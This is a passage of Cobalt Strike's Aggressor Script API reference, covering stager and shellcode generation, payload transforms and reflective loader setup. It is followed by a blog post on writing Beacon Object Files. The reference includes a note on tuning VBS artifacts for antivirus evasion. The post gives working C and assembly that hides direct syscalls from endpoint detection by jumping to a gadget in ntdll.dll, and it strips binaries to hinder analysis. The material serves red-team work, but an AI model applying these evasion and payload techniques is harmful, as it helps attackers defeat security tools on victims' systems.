});
Back to Top

prompt_file_open
Show a file open dialog.

Arguments
$1 - title of the dialog

$2 - default value

$3 - true/false: allow user to select multiple files?

$4 - a callback function. Called when the user chooses a file to open. The argument to the callback is the selected file. If multiple files are selected, they will still be specified as the first argument, separated by commas.

Example
prompt_file_open("Choose a file", $null, false, {
   show_message("You chose: $1");
});
Back to Top

prompt_file_save
Show a file save dialog.

Arguments
$1 - default value

$2 - a callback function. Called when the user chooses a filename. The argument to the callback is the desired file.

Example
prompt_file_save($null, {
   local('$handle');
   $handle = openf("> $+ $1");
   println($handle, "I am content");
   closef($handle);
});
Back to Top

prompt_text
Show a dialog that asks the user for text.

Arguments
$1 - text in the dialog

$2 - default value in the text field.

$3 - a callback function. Called when the user presses OK. The first argument to this callback is the text the user provided.

Example
prompt_text("What is your name?", "Cyber Bob", {
   show_mesage("Hi $1 $+ , nice to meet you!");
});
Back to Top

range
Generate an array of numbers based on a string description of ranges.

Arguments
$1 - a string with a description of ranges

Range Result
103   The number 103
3-8   The numbers 3, 4, 5, 6, and 7.
2,4-6 The numbers 2, 4, and 5.
Returns
An array of numbers within the specified ranges.

Example
printAll(range("2,4-6"));
Back to Top

redactobject
Removes a post-exploitation object (e.g., screenshot, keystroke buffer) from the user interface.

Arguments
$1 - the ID of the post-exploitation object.

Back to Top

removeTab
Close the active tab

Example
bind Ctrl+D {
   removeTab();
}
Back to Top

resetData
Reset Cobalt Strike's data model.

Back to Top

say
Post a public chat message to the event log.

Arguments
$1 - the message

Example
say("Hello World!");
Back to Top

sbrowser
Generate the session browser GUI component. Shows Beacon AND SSH sessions.

Returns
The session browser GUI object (a javax.swing.JComponent)

Example
addVisualization("Session Browser", sbrowser());
See also
&showVisualization

Back to Top

screenshots
Returns a list of screenshots from Cobalt Strike's data model.

Returns
An array of dictionary objects with information about each screenshot.

Example
printAll(screenshots());
Back to Top

script_resource
Returns the full path to a resource that is stored relative to this script file.

Arguments
$1 - the file to get a path for

Returns
The full path to the specified file.

Example
println(script_resource("dummy.txt"));
Back to Top

separator
Insert a separator into the current menu tree.

Example
popup foo {
   item "Stuff" { ... }
   separator();
   item "Other Stuff" { ... }
}
Back to Top

services
Returns a list of services in Cobalt Strike's data model.

Returns
An array of dictionary objects with information about each service.

Example
printAll(services());
Back to Top

setup_reflective_loader
Insert the reflective loader executable code into a beacon payload.

Arguments
$1 - Original beacon executable payload.

$2 - User defined Reflective Loader executable data.

Returns
The beacon executable payload updated with the user defined reflective loader. $null if there is an error.

Notes
The user defined Reflective Loader must be less than 5k.

Example
See BEACON_RDLL_GENERATE hook

# ---------------------------------------------------------------------
# Replace the beacons default loader with '$loader'.
# ---------------------------------------------------------------------
$temp_dll = setup_reflective_loader($2, $loader);
Back to Top

setup_strings
Apply the strings defined in the Malleable C2 profile to the beacon payload.

Arguments
$1 – beacon payload to modify

Returns
The updated beacon payload with the defined strings applied to the payload.

Example
See BEACON_RDLL_GENERATE hook

# Apply strings to the beacon payload.
$temp_dll = setup_strings($temp_dll);
Back to Top

setup_transformations
Apply the transformations rules defined in the Malleable C2 profile to the beacon payload.

Arguments
$1 – Beacon payload to modify

$2 – Beacon architecture (x86/x64)

Returns
The updated beacon payload with the transformations applied to the payload.

Example
See BEACON_RDLL_GENERATE hook

# Apply the transformations to the beacon payload.
$temp_dll = setup_transformations($temp_dll, $arch);
Back to Top

shellcode
DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &stager instead.

Returns raw shellcode for a specific Cobalt Strike listener

Arguments
$1 - the listener name

$2 - true/false: is this shellcode destined for a remote target?

$3 - x86|x64 - the architecture of the stager output.

Note
Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

Returns
A scalar containing shellcode for the specified listener.

Example
$data = shellcode("my listener", false, "x86");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
Back to Top

showVisualization
Switch Cobalt Strike visualization to a registered visualization.

Arguments
$1 - the name of the visualization

Example
bind Ctrl+H {
   showVisualization("Hello World");
}
See also
&showVisualization

Back to Top

show_error
Shows an error message to the user in a dialog box. Use this function to relay error information.

Arguments
$1 - the message text

Example
show_error("You did something bad.");
Back to Top

show_message
Shows a message to the user in a dialog box. Use this function to relay information.

Arguments
$1 - the message text

Example
show_message("You've won a free ringtone");
Back to Top

site_host
Host content on Cobalt Strike's web server

Arguments
$1 - the host for this site (&localip is a good default)

$2 - the port (e.g., 80)

$3 - the URI (e.g., /foo)

$4 - the content to host (as a string)

$5 - the mime-type (e.g., "text/plain")

$6 - a description of the content. Shown in Site Management -> Manage.

$7 - use SSL or not (true or false)

Returns
The URL to this hosted site

Example
site_host(localip(), 80, "/", "Hello World!", "text/plain", "Hello World Page", false);
Back to Top

site_kill
Remove a site from Cobalt Strike's web server

Arguments
$1 - the port

$2 - the URI

Example
# removes the content bound to / on port 80
site_kill(80, "/");
Back to Top

sites
Returns a list of sites tied to Cobalt Strike's web server.

Returns
An array of dictionary objects with information about each registered site.

Example
printAll(sites());
Back to Top

ssh_command_describe
Describe an SSH command.

Returns
A string description of the SSH command.

Arguments
$1 - the command

Example
println(ssh_command_describe("sudo"));
Back to Top

ssh_command_detail
Get the help information for an SSH command.

Returns
A string with helpful information about an SSH command.

Arguments
$1 - the command

Example
println(ssh_command_detail("sudo"));
Back to Top

ssh_command_register
Register help information for an SSH console command.

Arguments
$1 - the command

$2 - the short description of the command

$3 - the long-form help for the command.

Example
ssh_alias echo {
   blog($1, "You typed: " . substr($1, 5));
}

ssh_command_register(
   "echo", 
   "echo posts to the current session's log", 
   "Synopsis: echo [arguments]\n\nLog arguments to the SSH console");
Back to Top

ssh_commands
Get a list of SSH commands.

Returns
An array of SSH commands.

Example
printAll(ssh_commands());
Back to Top

stager
Returns the stager for a specific Cobalt Strike listener

Arguments
$1 - the listener name

$2 - x86|x64 - the architecture of the stager output.

Note
Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.

Returns
A scalar containing shellcode for the specified listener.

Example
$data = stager("my listener", "x86");

$handle = openf(">out.bin");
writeb($handle, $data);
closef($handle);
Back to Top

stager_bind_pipe
Returns a bind_pipe stager for a specific Cobalt Strike listener. This stager is suitable for use in lateral movement actions that benefit from a small named pipe stager. Stage with &beacon_stage_pipe.

Arguments
$1 - the listener name

Returns
A scalar containing x86 bind_pipe shellcode.

Example
# step 1. generate our stager
$stager = stager_bind_pipe("my listener");

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_pipe($bid, $target, "my listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my listener");
See also
&artifact_general

Back to Top

stager_bind_tcp
Returns a bind_tcp stager for a specific Cobalt Strike listener. This stager is suitable for use in localhost-only actions that require a small stager. Stage with &beacon_stage_tcp.

Arguments
$1 - the listener name

$2 - x86|x64 - the architecture of the stager output.

$3 - the port to bind to

Returns
A scalar containing bind_tcp shellcode

Example
# step 1. generate our stager
$stager = stager_bind_tcp("my listener", "x86", 1234);

# step 2. do something to run our stager

# step 3. stage a payload via this stager
beacon_stage_tcp($bid, $target, 1234, "my listener", "x86");

# step 4. assume control of the payload (if needed)
beacon_link($bid, $target, "my listener");
See also
&artifact_general

Back to Top

str_chunk
Chunk a string into multiple parts

Arguments
$1 - the string to chunk

$2 - the maximum size of each chunk

Returns
The original string split into multiple chunks

Example
# hint... :)
else if ($1 eq "template.x86.ps1") {
   local('$enc');
   $enc = str_chunk(base64_encode($2), 61);
   return strrep($data, '%%DATA%%', join("' + '", $enc));
}
Back to Top

str_decode
Convert a string of bytes to text with the specified encoding.

Arguments
$1 - the string to decode

$2 - the encoding to use.

Returns
The decoded text.

Example
# convert back to a string we can use (from UTF16-LE)
$text = str_decode($string, "UTF16-LE");
Back to Top

str_encode
Convert text to byte string with the specified character encoding.

Arguments
$1 - the string to encode

$2 - the encoding to use

Returns
The resulting string.

Example
# convert to UTF16-LE
$encoded = str_encode("this is some text", "UTF16-LE");
Back to Top

str_xor
Walk a string and XOR it with the provided key.

Arguments
$1 - the string to mask

$2 - the key to use (string)

Returns
The original string masked with the specified key.

Example
$mask  = str_xor("This is a string", "key");
$plain = str_xor($mask, "key");
Back to Top

sync_download
Sync a downloaded file (View -> Downloads) to a local path.

Arguments
$1 - the remote path to the file to sync. See &downloads

$2 - where to save the file locally

$3 - (optional) a callback function to execute when download is synced. The first argument to this function is the local path of the downloaded file.

Example
# sync all downloads
command ga {
   local('$download $lpath $name $count');
   foreach $count => $download (downloads()) {
      ($lpath, $name) = values($download, @("lpath", "name"));
   
      sync_download($lpath, script_resource("file $+ .$count"), lambda({ 
         println("Downloaded $1 [ $+ $name $+ ]"); 
      }, \$name));
   }
}
Back to Top

targets
Returns a list of host information in Cobalt Strike's data model.

Returns
An array of dictionary objects with information about each host.

Example
printAll(targets());
Back to Top

tbrowser
Generate the target browser GUI component.

Returns
The target browser GUI object (a javax.swing.JComponent)

Example
addVisualization("Target Browser", tbrowser());
See also
&showVisualization

Back to Top

tokenToEmail
Covert a phishing token to an email address.

Arguments
$1 - the phishing token

Returns
The email address or "unknown" if the token is not associated with an email.

Example
set PROFILER_HIT {
   local('$out $app $ver $email');
   $email = tokenToEmail($5);         
   $out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $email $+ ] Applications";
   foreach $app => $ver ($4) {
      $out .= "\n\t $+ $[25]app $ver";
   }
   return "$out $+ \n\n";
}
Back to Top

transform
Transform shellcode into another format.

Arguments
$1 - the shellcode to transform

$2 - the transform to apply

Type  Description
array comma separated byte values
hex   Hex-encode the value
powershell-base64 PowerShell.exe-friendly base64 encoder
vba   a VBA array() with newlines added in
vbs   a VBS expression that results in a string
veil  Veil-ready string (\x##\x##)
Returns
The shellcode after the specified transform is applied

Example
println(transform("This is a test!", "veil"));
Back to Top

transform_vbs
Transform shellcode into a VBS expression that results in a string

Arguments
$1 - the shellcode to transform

$2 - the maximum length of a plaintext run

Notes
Previously, Cobalt Strike would embed its stagers into VBS files as several Chr() calls concatenated into a string.
Cobalt Strike 3.9 introduced features that required larger stagers. These larger stagers were too big to embed into a VBS file with the above method.
To get past this VBS limitation, Cobalt Strike opted to use Chr() calls for non-ASCII data and runs of double-quoted strings for printable characters.
This change, an engineering necessity, unintentionally defeated static anti-virus signatures for Cobalt Strike's default VBS artifacts at that time.
If you're looking for an easy evasion benefit with VBS artifacts, consider adjusting the plaintext run length in your Resource Kit.
Returns
The shellcode after this transform is applied

Example
println(transform_vbs("This is a test!", "3"));
Back to Top

tstamp
Format a time into a date/time value. This value does not include seconds.

Arguments
$1 - the time [milliseconds since the UNIX epoch]

Example
println("The time is now: " . tstamp(ticks()));
See also
&dstamp

Back to Top

unbind
Remove a keyboard shortcut binding.

Arguments
$1 - the keyboard shortcut

Example
# restore default behavior of Ctrl+Left and Ctrl+Right
unbind("Ctrl+Left");
unbind("Ctrl+Right");
See also
&bind

Back to Top

url_open
Open a URL in the default browser.

Arguments
$1 - the URL to open

Example
command go {
   url_open("https://www.cobaltstrike.com/");
}
Back to Top

users
Returns a list of users connected to this team server.

Returns
An array of users.

Example
foreach $user (users()) {
   println($user);
}
Back to Top

vpn_interface_info
Get information about a VPN interface.

Arguments
$1 - the interface name

$2 - [Optional] the key to extract a value for

Returns
%info = vpn_interface_info("interface");
Returns a dictionary with the metadata for this interface.

$value = vpn_interface_info("interface", "key");
Returns the value for the specified key from this interface's metadata

Example
# create a script console alias to interface info
command interface {
   println("Interface $1");
   foreach $key => $value (vpn_interface_info($1)) {
      println("$[15]key $value");
   }
}
Back to Top

vpn_interfaces
Return a list of VPN interface names

Returns
An array of interface names.

Example
printAll(vpn_interfaces());
Back to Top

vpn_tap_create
Create a Covert VPN interface on the team server system.

Arguments
$1 - the interface name (e.g., phear0)

$2 - the MAC address ($null will make a random MAC address)

$3 - reserved; use $null for now.

$4 - the port to bind the VPN's channel to

$5 - the type of channel [bind, http, icmp, reverse, udp]

Example
vpn_tap_create("phear0", $null, $null, 7324, "udp");
Back to Top

vpn_tap_delete
Destroy a Covert VPN interface

Arguments
$1 - the interface name (e.g., phear0)

Example
vpn_tap_destroy("phear0");
Back to Top


Popup Hooks
The following popup hooks are available in Cobalt Strike:

Hook  Where Arguments
aggressor   Cobalt Strike Menu    
attacks  Attacks Menu    
beacon   [session]   $1 = selected beacon IDs (array)
beacon_top  [session]   $1 = selected beacon IDs (array)
beacon_bottom  [session]   $1 = selected beacon IDs (array)
credentials Credential Browser   $1 = selected credential rows (array of hashes)
filebrowser [file in file browser]  $1 = beacon ID, $2 = folder, $3 = selected files (array)
help  Help Menu    
listeners   Listeners table   $1 = selected listener names (array)
pgraph   [pivot graph]  
processbrowser Process Browser   $1 = Beacon ID, $2 = selected processes (array)
processbrowser_multi Multi-Session Process Browser $1 = selected processes (array)
reporting   Reporting Menu  
ssh   [SSH session]  $1 = selected session IDs (array)
targets  [host]   $1 = selected hosts (array)
targets_other  [host]   $1 = selected hosts (array)
view  View Menu    


Report-Only Functions
These functions apply to Cobalt Strike's custom report capability only.

agApplications
Pull information from the applications model.

Arguments
$1 - the model to pull this information from.

Returns
An array of dictionary objects that describes each entry in the applications model.

Example
printAll(agApplications($model));
agC2info
Pull information from the c2info model.

Arguments
$1 - the model to pull this information from.

Returns
An array of dictionary objects that describes each entry in the c2info model.

Example
printAll(agC2Info($model));
agCredentials
Pull information from the credentials model

Arguments
$1 - the model to pull this information from.

Returns
An array of dictionary objects that describes each entry in the credentials model.

Example
printAll(agCredentials($model));
agServices
Pull information from the services model

Arguments
$1 - the model to pull this information from.

Returns
An array of dictionary objects that describes each entry in the services model.

Example
printAll(agServices($model));
agSessions
Pull information from the sessions model

Arguments
$1 - the model to pull this information from.

Returns
An array of dictionary objects that describes each entry in the sessions model.

Example
printAll(agSessions($model));
agTargets
Pull information from the targets model.

Arguments
$1 - the model to pull this information from.

Returns
An array of dictionary objects that describes each entry in the targets model.

Example
printAll(agTargets($model));
agTokens
Pull information from the phishing tokens model.

Arguments
$1 - the model to pull this information from.

Returns
An array of dictionary objects that describes each entry in the phishing tokens model.

Example
printAll(agTokens($model));
attack_describe
Maps a MITRE ATT&CK tactic ID to its longer description.

Returns
The full description of the tactic

Example
println(attack_describe("T1134"));
attack_detect
Maps a MITRE ATT&CK tactic ID to its detection strategy

Returns
The detection strategy for this tactic.

Example
println(attack_detect("T1134"));
attack_mitigate
Maps a MITRE ATT&CK tactic ID to its mitigation strategy

Returns
The mitigation strategy for this tactic.

Example
println(attack_mitigate("T1134"));
attack_name
Maps a MITRE ATT&CK tactic ID to its short name.

Returns
The name or short description of the tactic.

Example
println(attack_name("T1134"));
attack_tactics
An array of MITRE ATT&CK tactics known to Cobalt Strike.

https://attack.mitre.org

Returns
An array of tactic IDs (e.g., T1001, T1002, etc.).

Example
printAll(attack_tactics());
attack_url
Maps a MITRE ATT&CK tactic ID to the URL where you can learn more.

Returns
The URL associated with this tactic.

Example
println(attack_url("T1134"));
bookmark
Define a bookmark [PDF document only]

Arguments
$1 - The bookmark to define [must be the same as &h1 or &h2 title].

$2 - (Optional) Define a child bookmark [must be the same as &h1 or &h2 title].

Example
# build out a document structure
h1("First");
h2("Child #1");
h2("Child #2");
 
# define bookmarks for it
bookmark("First");
bookmark("First", "Child #1");
bookmark("First", "Child #2");
br
Print a line-break.

Example
br();
describe
Set a description for a report.

Arguments
$1 - The report to set a default description for.

$2 - The default description

Example
describe("Foo Report", "This report is about my foo");
 
report "Foo Report" {
   # yada yada yada...
}
h1
Prints a title heading.

Arguments
$1 - the heading to print.

Example
h1("I am the title");
h2
Prints a sub-title heading.

Arguments
$1 - the text to print.

Example
h2("I am the sub-title");
h3
Prints a sub-sub-title heading.

Arguments
$1 - the text to print.

Example
h3("I am not important.");
h4
Prints a sub-sub-sub-title heading.

Arguments
$1 - the text to print.

Example
h4("I am really not important.");
kvtable
Prints a table with key/value pairs.

Arguments
$1 - a dictionary with key/value pairs to print.

Example
# use an ordered-hash to preserve order
$table = ohash();
$table["#1"] = "first";
$table["#2"] = "second";
$table["#3"] = "third";
 
kvtable($table);
landscape
Changes the orientation of this document to landscape.

Example
landscape();
layout
Prints a table with no borders and no column headers.

Arguments
$1 - an array with column names

$2 - an array with width values for each column

$3 - an array with a dictionary object for each row. The dictionary should have keys that correspond to each column.

Example
@cols    = @("First", "Second", "Third");
@widths  = @("2in", "2in", "auto");
@rows    = @(
   %(First => "a", Second => "b", Third => "c"),
   %(First => "1", Second => "2", Third => "3"));
 
layout(@cols, @widths, @rows);
list_unordered
Prints an unordered list

Arguments
$1 - an array with individual bullet points.

Example
@list = @("apple", "bat", "cat");
list_unordered(@list);
nobreak
Group report elements together without a line break.

Arguments
$1 - the function with report elements to group together.

Example
# keep this stuff on the same page...
nobreak({
   h2("I am the sub-title");
   p("I am the initial information");
})
output
Print elements against a grey backdrop. Line-breaks are preserved.

Arguments
$1 - the function with report elements to group as output.

Example
output({
   p("This is line 1
   and this is line 2.");
});
p
Prints a paragraph of text.

Arguments
$1 - the text to print.

Example
p("I am some text!");
p_formatted
Prints a paragraph of text with some format preservation.

Arguments
$1 - the text to print.

The Format Markup
1. This function preserves newlines

2. You may specify bulleted lists:

* I am item 1
* I am item 2
* etc.
3. You may specify a heading

===I am a heading===
Example
p_formatted("===Hello World===\n\nThis is some text.\nI am on a new line\nAnd, I am:\n* Cool\n* Awesome\n* A bulleted list");
table
Prints a table

Arguments
$1 - an array with column names

$2 - an array with width values for each column

$3 - an array with a dictionary object for each row. The dictionary should have keys that correspond to each column.

Example
@cols    = @("First", "Second", "Third");
@widths  = @("2in", "2in", "auto");
@rows    = @(
   %(First => "a", Second => "b", Third => "c"),
   %(First => "1", Second => "2", Third => "3"));
 
table(@cols, @widths, @rows);
ts
Prints a time/date stamp in italics.

Example
ts();

Writing Beacon Object Files: Flexible, Stealthy, and Compatible
Monday 20 December, 2021

Our colleagues over at Core Security have been doing great things with Cobalt Strike, making use of it in their own engagements. They wrote up this post on creating Cobalt Strike Beacon Object Files using the MinGW compiler on Linux. It covers several ideas and best practices that will increase the quality of your BOFs.

Flexibility
Compiling to Both Object Files and Executables

While writing a BOF is great, it’s always worth making the code compile to both BOF and EXE.

This provides a lot more options: we could run our capability outside Beacon by just writing the EXE to disk and executing it. We could then convert it into position independent shellcode using donut and run it from memory.

Usually, calling a Windows API from Beacon Object File would appear as follows:

program.h

WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *s, size_t maxlen);
program.c

int length = MSVCRT$strnlen(someString, 256);
BeaconPrintf(CALLBACK_OUTPUT, "The variable length is %d.", length);
Makefile

BOFNAME := program
CC_x64 := x86_64-w64-mingw32-gcc
all:
    $(CC_x64) -c source/program.c -o compiled/$(BOFNAME).x64.o -masm=intel -Wall
However, we would like to create both a BOF and an EXE file using the same file. A practical option to achieve the creation of both files is to add a conditional compilation clause as shown below. In this example, we are using BOF:

Makefile

BOFNAME := program
CC_x64 := x86_64-w64-mingw32-gcc
all:
    $(CC_x64) -c source/program.c -o compiled/$(BOFNAME).x64.o   -masm=intel -Wall -DBOF
    $(CC_x64)    source/program.c -o compiled/$(BOFNAME).x64.exe -masm=intel -Wall
program.h

#ifdef BOF
WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *s, size_t maxlen);
#define strnlen MSVCRT$strnlen
#endif
#ifdef BOF
#define PRINT(...) { \
     BeaconPrintf(CALLBACK_OUTPUT, __VA_ARGS__); \
}
#else
#define PRINT(...) { \
     fprintf(stdout, __VA_ARGS__); \
     fprintf(stdout, "\n"); \
}
#endif
program.c

int length = strnlen(someString, 256);
PRINT("The variable length is %d.", length);
Finally, in our program.c file, we would define the “go” (BOF’s entry point) and “main” functions:

program.c

#ifdef BOF
void go(char* args, int length)
{
     // BOF code
}
#else
int main(int argc, char* argv[])
{
    // EXE code
{
#endif
Stealth
Syswhispers2 Integration

syswhispers2 is an awesome implementation of direct syscalls. However, if we take a look under the hood, we can see that it uses a global variable to achieve its objective. Unfortunately, global variables do not work very well with Beacon. This is because Beacon Object Files don’t have a .bss section, which is where global variables are typically stored.

A useful trick, originally suggested by Twitter user @the_bit_diddler, is to move the global variables to the .data section using a compiler directive, as shown below:

syscalls.c (before)

SW2_SYSCALL_LIST SW2_SyscallList;
syscalls.c (after)

SW2_SYSCALL_LIST SW2_SyscallList __attribute__ ((section(".data")));
This small change will allow the use of the syswhispers2 logic in a BOF.
In addition to the global variables change, there are other minor changes that need to be made so that the the code of syswhispers2 can compile with MinGW. For example, the API hashes format needs to be changed from 0ABCD1234h to: 0xABCD1234. The tool InlineWhispers should take care of the rest.

Using direct syscalls is a powerful technique to avoid userland hooks. Ironically, using them could get us caught.

There are at least two ways of detecting direct syscalls: dynamic and static.
The dynamic method is simply detecting that a syscall was called from a module that is not ntdll.dll. The static method is to find a syscall instruction by inspecting the program’s code and memory. How can we avoid both these detections? The answer is to call our syscalls from ntdll.dll.

First, we must locate where ntdll.dll is loaded. Luckily, syswhispers2 already has the code to do just that. Then, we can parse its headers and locate the code section.

Hiding the Use of syscalls

Once we know code section base address and size of ntdll.dll, all we need to do is search for the opcodes of the instructions syscall; ret. In x64, the bytes we are looking for are: { 0x0f, 0x05, 0xc3 }.

While it is true that EDRs and other tools hook (overwrite) syscalls in ntdll.dll, they certainly do not hook all existing syscalls, so we are guaranteed to find at least one occurrence of these three bytes. We might even find them by chance in a misaligned offset.

Once we find the syscall; ret bytes, we can save the address in a global variable (stored in the .data section). That way, we only need to find it once.

All what we have just described can be seen in the following code sequence:

syscalls.c

#ifdef _WIN64
#define PEB_OFFSET 0x60
#define READ_MEMLOC __readgsqword
#else
#define PEB_OFFSET 0x30
#define READ_MEMLOC __readfsdword
#endif

PVOID SyscallAddress __attribute__ ((section(".data"))) = NULL;
 
__attribute__((naked)) void SyscallNotFound(void)
{
    __asm__(" SyscallNotFound: \n\
        mov eax, 0xC0000225 \n\
        ret \n\
    ");
}

PVOID GetSyscallAddress(void)
{
#ifdef _WIN64
    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
#else
    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
#endif

    // Return early if the SyscallAddress is already defined
    if (SyscallAddress)
    {
        // make sure the instructions have not been replaced
        if (!strncmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
            return SyscallAddress;
    }
  
    // set the fallback as the default
    SyscallAddress = (PVOID) SyscallNotFound;
 
    // find the address of NTDLL
    PSW2_PEB Peb = (PSW2_PEB)READ_MEMLOC(PEB_OFFSET);
    PSW2_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;
    PVOID BaseOfCode = NULL;
    ULONG32 SizeOfCode = 0;
 
    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PSW2_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW2_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW2_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;
 
        ExportDirectory = SW2_RVA2VA(PIMAGE_EXPORT_DIRECTORY, DllBase, VirtualAddress);
 
        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = SW2_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c)
        {
            BaseOfCode = SW2_RVA2VA(PVOID, DllBase, NtHeaders->OptionalHeader.BaseOfCode);
            SizeOfCode = NtHeaders->OptionalHeader.SizeOfCode;
            break;
        }
    }
    if (!BaseOfCode || !SizeOfCode)
        return SyscallAddress;
 
    // try to find a 'syscall' instruction inside of NTDLL's code section
  
    PVOID CurrentAddress = BaseOfCode;
    PVOID EndOfCode = SW2_RVA2VA(PVOID, BaseOfCode, SizeOfCode - sizeof(syscall_code) + 1);
    while ((ULONG_PTR)CurrentAddress <= (ULONG_PTR)EndOfCode)
    {
        if (!strncmp((PVOID)syscall_code, CurrentAddress, sizeof(syscall_code)))
        {
            // found 'syscall' instruction in ntdll
            SyscallAddress = CurrentAddress;
            return SyscallAddress;
        }
        // increase the current address by one
        CurrentAddress = SW2_RVA2VA(PVOID, CurrentAddress, 1);
    }
    // syscall entry not found, using fallback
    return SyscallAddress;
}
syscalls.h

EXTERN_C PVOID GetSyscallAddress(void);
In the extremely unlikely scenario in which we do not find ANY occurrence of these three bytes in the code section of ntdll.dll, we can instead use our own function: SyscallNotFound. This simply returns STATUS_NOT_FOUND. We could implement a syscall; ret, but keep in mind that we want to avoid having the syscall instruction in our code in order to evade static analysis.

Once we have the memory address of interest, all we need to do is to modify the assembly of our syscall functions to jump to this memory address:

push rcx ; save volatile registers
push rdx
push r8
push r9
sub rsp, 0x28 ; allocate some space on the stack
call GetSyscallAddress ; call the C function and get the address of the 'syscall' instruction in ntdll.dll
add rsp, 0x28
push rax ; save the address in the stack
sub rsp, 0x28 ; allocate some space on the stack
mov ecx, 0x0123ABCD ; set the syscall hash as the parameter
call SW2_GetSyscallNumber ; get the id of the syscall using syswhispers2
add rsp, 0x28
pop r11 ; store the address of the 'syscall' instruction on r11
pop r9 ; restore the volatile registers
pop r8
pop rdx
pop rcx
mov r10, rcx
jmp r11 ; jump to ntdll.dll and call the syscall from there
And voilà, we use direct syscalls from a valid module (ntdll.dll) without having a syscall instruction in our code ????.

Stripping the Debug Symbols

While this step is not critical, stripping your binaries is clever enough that it is worth the extra step. Once completed, they are not only a lot harder to analyze but they also get smaller in size.

All we need to do is modify the Makefile to look as follows:

BOFNAME := program
CC_x64 := x86_64-w64-mingw32-gcc
STRIP_x64 := x86_64-w64-mingw32-strip
 
all:
    $(CC_x64) -c program.c -o compiled/$(BOFNAME).x64.o   -masm=intel -Wall -DBOF
    $(STRIP_x64) --strip-unneeded compiled/$(BOFNAME).x64.o
 
    $(CC_x64)    program.c -o compiled/$(BOFNAME).x64.exe -masm=intel -Wall
    $(STRIP_x64) --strip-all compiled/$(BOFNAME).x64.exe
While the EXE does end up being a smaller, stripping the BOF doesn’t reduce its size significantly (only around 500 bytes).

Once the debugging symbols are stripped, if the program is compiled without changing the code, the resulting object file and executable will be the same regardless of who compiled it. This means that everyone will get the same object files after compiling it.


Is that a bad thing? Potentially, but only if fingerprinting is a concern. The code could be slightly modified and recompiled. For example, the seed of syswhispers2 could be changed. If code is run from a Beacon or in memory in the form of shellcode, fingerprinting should not be worrisome, as static analysis in those cases is not possible.

Compatibility
Supporting x86 might seem hard and pointless, but we shouldn’t limit ourselves and have every 32-bit machine out of our reach. Supporting x86 is a fun challenge and pays off in the end.

Code Logic

We’ll begin by introducing some conditional compilation clauses based on the architecture:

#if _WIN64
// x64 version of some logic
#else
// x86 version of some logic
#endif
If we want to add some code that is exclusive to x64:

#if _WIN64
// some code only for x64
#endif
If we want to add some code that is exclusive to x86:

#ifndef _WIN64
// some code only for x86
#endif
X86 syscall Support

To support syscalls in x86, we will have to deal with a few difficulties that are very manageable.

Function Names Within x86 Assembly

The main issue that we can encounter trying to call the C functions SW2_GetSyscallNumber and GetSyscallAddress from x86 inline assembly, results in these compiler errors:

/usr/lib/gcc/i686-w64-mingw32/11.2.0/../../../../i686-w64-mingw32/bin/ld: /tmp/ccbjuGDN.o:program.c:(.text+0x68): undefined reference to `GetSyscallAddress'

/usr/lib/gcc/i686-w64-mingw32/11.2.0/../../../../i686-w64-mingw32/bin/ld: /tmp/ccbjuGDN.o:program.c:(.text+0x73): undefined reference to `SW2_GetSyscallNumber'
There is some GCC documentation which explains that, for some reason, in x86 inline assembly, C functions (and variables) are prepended with an underscore to their name. So, in this case,  GetSyscallAddress becomes _GetSyscallAddress and SW2_GetSyscallNumber becomes _SW2_GetSyscallNumber.

Instead of calling them with the underscore, we can just adapt their definition to specify their name in assembly, like this:

syscalls.h

EXTERN_C DWORD SW2_GetSyscallNumber(DWORD FunctionHash) asm ("SW2_GetSyscallNumber");
EXTERN_C PVOID GetSyscallAddress(void) asm ("GetSyscallAddress");
We also need to do the same with the definitions for all the syscalls in syscalls.h. For example, here’s how we can modify NtOpenProcess:

syscalls.h (before)

EXTERN_C NTSTATUS NtOpenProcess(
OUT PHANDLE ProcessHandle,
IN ACCESS_MASK DesiredAccess,
IN POBJECT_ATTRIBUTES ObjectAttributes,
IN PCLIENT_ID ClientId OPTIONAL);
syscalls.h (after)

EXTERN_C NTSTATUS NtOpenProcess(
OUT PHANDLE ProcessHandle,
IN ACCESS_MASK DesiredAccess,
IN POBJECT_ATTRIBUTES ObjectAttributes,
IN PCLIENT_ID ClientId OPTIONAL) asm ("NtOpenProcess");
Once this is done, the weird x86 naming system should work fine.

Syscalls With Conflicting Types

There are some syscalls that fail to compile in x86, and produce an error message like:

error: conflicting types for ‘NtClose’;

While there are surely others, these syscalls are confirmed to have this issue:

NtClose
NtQueryInformationProcess
NtCreateFile
NtQuerySystemInformation
NtQueryObject
It appears that in x86, MinGW already has a definition of these functions somewhere. To fix this, we just need to rename the troubling syscalls by prepending an underscore to their name in the x86 version.

